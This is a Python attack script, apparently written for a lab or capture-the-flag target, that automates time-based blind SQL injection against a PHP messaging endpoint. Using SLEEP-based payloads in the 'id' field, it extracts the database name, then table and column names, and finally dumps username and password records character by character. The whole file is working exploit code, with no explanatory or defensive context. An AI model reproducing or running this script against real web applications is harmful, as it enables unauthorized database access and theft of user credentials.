import requests
import signal, sys, time, string
from pwn import log

TARGET_URL = "http://192.168.1.117/send_message.php"
CHARACTERS = string.ascii_letters + string.digits + "_@.-:$"

def def_handler(sig, frame):
    print("\n[!] Saliendo...\n")
    sys.exit(0)

def time_based_sqli(sql_template):
    result = ""
    p = log.progress("Extrayendo")

    session = requests.Session()

    cookies = {
        "PHPSESSID": "pabh70lknuir59i396l0c2ujjn"
    }

    for pos in range(1, 50):
        found = False
        for c in CHARACTERS:
            payload = sql_template.format(pos=pos, char=c)

            data = {
                "msg": "test",
                "id": payload
            }

            p.status(result + c)
            start = time.time()
            r = session.post(TARGET_URL, data=data, cookies=cookies)
            delay = time.time() - start

            if delay > 0.4:  # Ajusta según tu umbral real
                result += c
                found = True
                break

        if not found:
            break

    p.success(result)
    return result

def get_tables(db_name):
    print("[*] Extrayendo nombres de tablas...")
    tables = []

    for i in range(0, 5):  # máximo 5 tablas
        print(f"  [+] Tabla {i+1}")

        sql = (
            "1' AND (SELECT 1 FROM (SELECT IF(SUBSTRING((SELECT table_name FROM information_schema.tables "
            f"WHERE table_schema='{db_name}' LIMIT {i},1),{{pos}},1)='{{char}}', SLEEP(0.5), 0))pwned) AND '1'='1 -- -"
        )

        name = time_based_sqli(sql)
        if not name:
            break
        tables.append(name)
    return tables


def get_columns(db_name, table):
    print(f"[*] Extrayendo columnas de `{table}`...")
    columns = []

    for i in range(0, 5):  # máximo 5 columnas
        print(f"  [+] Columna {i+1}")

        sql = (
            "1' AND (SELECT 1 FROM (SELECT IF(SUBSTRING((SELECT column_name FROM information_schema.columns "
            f"WHERE table_name='{table}' AND table_schema='{db_name}' LIMIT {i},1),{{pos}},1)='{{char}}', SLEEP(0.5), 0))pwned) AND '1'='1 -- -"
        )

        name = time_based_sqli(sql)
        if not name:
            break
        columns.append(name)
    return columns


def dump_users(table, col1, col2):
    print(f"[*] Extrayendo registros de `{table}`...")

    for i in range(0, 5):  # máximo 5 usuarios
        print(f"  [+] Registro {i+1}")

        sql = (
            "1' AND (SELECT 1 FROM (SELECT IF(SUBSTRING((SELECT CONCAT({col1},0x3a,{col2}) FROM {table} LIMIT {i},1),{{pos}},1)='{{char}}', SLEEP(0.5), 0))pwned) AND '1'='1 -- -"
        ).format(col1=col1, col2=col2, table=table, i=i)

        row = time_based_sqli(sql)
        if not row:
            break
        print(f"    -> {row}")

if __name__ == "__main__":
    signal.signal(signal.SIGINT, def_handler)

    print("[*] Extrayendo nombre de base de datos...")

    payload = (
        "1' AND (SELECT 1 FROM (SELECT IF(SUBSTRING(DATABASE(),{pos},1)='{char}',"
        " SLEEP(0.5), 0))pwned) AND '1'='1 -- -"
    )

    db_name = time_based_sqli(payload)
    tables = get_tables(db_name)

    for table in tables:
        columns = get_columns(db_name, table)

        if table == "user" and "username" in columns and "password" in columns:
            dump_users(table, "username", "password")
